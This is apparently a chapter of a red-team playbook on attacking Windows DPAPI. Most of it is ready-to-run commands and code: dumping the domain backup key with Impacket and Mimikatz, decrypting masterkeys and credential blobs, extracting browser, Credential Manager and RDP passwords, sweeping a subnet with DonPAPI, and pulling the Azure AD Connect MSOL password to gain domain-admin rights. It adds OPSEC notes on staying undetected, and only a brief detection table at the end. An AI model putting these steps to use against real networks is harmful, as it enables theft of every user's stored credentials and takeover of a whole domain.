# Phase 15: DPAPI Attacks

> Data Protection API (DPAPI) is Windows' built-in secret storage. It encrypts credentials for browsers, credential manager, RDP passwords, WiFi keys, and more. A massive privilege escalation surface on workstations and servers.

---

## Background: How DPAPI Works

- DPAPI encrypts data with a **masterkey** derived from the user's password (or machine key for SYSTEM-level secrets)
- Masterkeys are stored encrypted in `%APPDATA%\Microsoft\Protect\<SID>\`
- To decrypt any DPAPI blob, you need the masterkey
- To decrypt the masterkey, you need:
  - The user's **password or NTLM hash** (for user masterkeys), OR
  - The **domain backup key** (a single RSA key that can decrypt ALL user masterkeys in the domain — stored on the DC since domain creation)

**The domain backup key is the crown jewel**: if you have it, you can decrypt every DPAPI-protected secret from every user in the domain offline, forever, even if their passwords change.

---

## 1. Find DPAPI Blobs

```bash
# Common locations:
# User credentials
%APPDATA%\Microsoft\Credentials\
%LOCALAPPDATA%\Microsoft\Credentials\

# Masterkeys
%APPDATA%\Microsoft\Protect\<UserSID>\

# Chrome / Edge saved passwords
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data

# RDP saved credentials
%LOCALAPPDATA%\Microsoft\Remote Desktop Connection Manager\
%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\

# SSH private keys (Windows OpenSSH agent)
%APPDATA%\Microsoft\SystemCertificates\My\
```

```powershell
# Find all DPAPI blobs on the system
Get-ChildItem -Force -Recurse "$env:APPDATA\Microsoft\Credentials" -ErrorAction SilentlyContinue
Get-ChildItem -Force -Recurse "$env:LOCALAPPDATA\Microsoft\Credentials" -ErrorAction SilentlyContinue
```

---

## 2. Dump Domain Backup Key (DA Required)

> With this single key, you can decrypt ALL user DPAPI masterkeys in the entire domain — offline, without touching LSASS.

```bash
# Impacket — dump the domain backup key
dpapi.py backupkeys --export -t lab.local/administrator:Password1@10.10.10.10
# Saves: ntds_capi_*.pvk (private key file)

# With hash
dpapi.py backupkeys --export -t -hashes :<NTLMhash> lab.local/administrator@10.10.10.10
```

```powershell
# Mimikatz
lsadump::backupkeys /system:dc01.lab.local /export
# Exports: ntds_capi_*.pvk and ntds_legacy_*.key
```

Store this key. It works on **all users in the domain**, now and in the future.

🔴 **OPSEC**: Backup key request goes to the DC's LSARPC endpoint. Event 4662 on the domain object with `ms-FVE-RecoveryInformation` access. DfI may alert on this. Rarely triggered so unusual.

---

## 3. Decrypt User Masterkeys

```bash
# With the user's password/hash directly
dpapi.py masterkey -file "/path/to/masterkey_file" -sid S-1-5-21-...-1234 \
  -password Password1

# With the domain backup key (preferred — no password needed)
dpapi.py masterkey -file "/path/to/masterkey_file" \
  -pvk ntds_capi_0_*.pvk

# Output: masterkey GUID and value — save these for blob decryption
```

---

## 4. Decrypt Credential Blobs

```bash
# Decrypt a specific credential blob
dpapi.py credential -file "/path/to/blob" -key <masterkey_hex>

# Or with domain backup key directly
dpapi.py credential -file "/path/to/blob" -pvk ntds_capi_0_*.pvk
```

---

## 5. Chrome / Edge Saved Passwords

Browser saves passwords encrypted with DPAPI. The "encryption key" is stored in `Local State` file, itself DPAPI-encrypted.

```bash
# SharpChrome — dump Chrome/Edge saved passwords
.\SharpChrome.exe logins
.\SharpChrome.exe logins /pvk:ntds_capi_0_*.pvk    # use domain backup key

# HackBrowserData — cross-browser dump
.\HackBrowserData.exe -b chrome -f json -o ./output

# Manual: copy browser files then decrypt offline
# Copy: Login Data (SQLite), Local State, Cookies
# Decrypt key from Local State, then decrypt Login Data fields
```

```python
# Python — manual decryption of Chrome DPAPI-wrapped AES key
import json, base64, win32crypt, sqlite3

local_state = json.load(open("Local State"))
enc_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
aes_key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
# Then use AES-GCM to decrypt Login Data entries
```

🟢 **OPSEC**: Copying files is quiet. The actual decryption is offline — no network traffic.

---

## 6. Windows Credential Manager

```powershell
# List saved credentials
cmdkey /list

# Mimikatz — dump all credential manager entries
vault::list
vault::cred /patch
```

```bash
# From a DPAPI blob (usually in %LOCALAPPDATA%\Microsoft\Credentials\)
dpapi.py credential -file /mnt/user-data/Credentials/<GUID> -pvk ntds_capi_0_*.pvk
```

Common finds: RDP passwords, network share passwords, application service passwords, Wi-Fi PSKs.

---

## 7. RDP Saved Passwords

```powershell
# Dump RDP saved credentials
$creds = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Remote Desktop Connection Manager\" -Recurse -ErrorAction SilentlyContinue
# Blobs in %APPDATA%\Microsoft\Credentials\ — decrypt as above
```

```bash
# Identify which blob is RDP-related: look at blob metadata
dpapi.py credential -file <blob> -pvk ntds.pvk
# Contains: target hostname, username, password
```

---

## 8. Remote DPAPI Dump (as DA)

```bash
# secretsdump also extracts DPAPI masterkeys from NTDS
secretsdump.py lab.local/administrator:Password1@10.10.10.10 | grep dpapi

# SharpDPAPI — remote DPAPI extraction
.\SharpDPAPI.exe triage /server:ws01.lab.local

# DonPAPI — all-in-one remote DPAPI dumper across the network
python3 DonPAPI.py lab.local/administrator:Password1@10.10.10.0/24
# Dumps Chrome, Credential Manager, cookies from every accessible host — requires local admin
```

---

## 9. DPAPI Machine Keys (SYSTEM-level Secrets)

Some secrets are encrypted with the **machine key** (not user key) — accessible only as SYSTEM or admin:

```powershell
# Mimikatz — machine DPAPI secrets
dpapi::cache
dpapi::cred /in:"C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\<GUID>"
# Machine key derived from machine account password + local secrets
```

Common SYSTEM DPAPI finds:
- Scheduled task credentials
- IIS application pool passwords
- SCCM Network Access Account (NAC) passwords (see Phase 17)
- Azure AD Connect (MSOL account password)
- WiFi pre-shared keys (`netsh wlan export profile`)

---

## 10. Azure AD Connect Password Extraction

If AAD Connect is installed, it stores the MSOL sync account password in DPAPI:

```powershell
# Retrieve AAD Connect creds (run as SYSTEM on the AAD Connect server)
# Tool: Get-MSOLCredentials.ps1 or adconnectdump.py

# Decrypt from registry
$key = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\AD Sync\Parameters").SQLConnectionString
# Then decrypt the DPAPI blob that holds the MSOL password
```

```bash
python3 adconnectdump.py -dc-ip 10.10.10.10 'lab.local/administrator:Password1@aadconnect.lab.local'
# Returns MSOL account username + plaintext password
# MSOL account has DCSync rights → DA in one step
```

💀 **OPSEC**: Extremely high-value target. MSOL account has replication rights — its compromise is effectively equivalent to DA. Detection if the account is monitored for unexpected use.

---

## Quick Win Summary

```
DA → dump domain backup key → decrypt ALL user masterkeys in domain
↓
Offline decryption of:
  • Browser saved passwords (Chrome, Edge, Firefox)
  • Windows Credential Manager (RDP, share, app creds)
  • Azure AD Connect MSOL password (= DA-equivalent)
  • Scheduled task / IIS / SCCM NAC credentials
  • SSH keys, code signing certs
```

---

## Blue-Team Detection

| Action | Detection |
|--------|-----------|
| Domain backup key retrieval | Event 4662 on DC (LSARPC); unusual DPAPI backup key request |
| Credential Manager access | Event 5379 (Credential Manager accessed) |
| Chrome Login Data access | File access telemetry (Sysmon Event 11) |
| DonPAPI / remote sweep | SMB and DPAPI calls across many hosts from admin |

---

## Next Step

MSOL password recovered → DCSync → **Phase 7: Domain Dominance** (`07-domain-dominance.md`)
Browser creds recovered → potentially new accounts → **Phase 3: Enumeration** (`03-enumeration.md`)
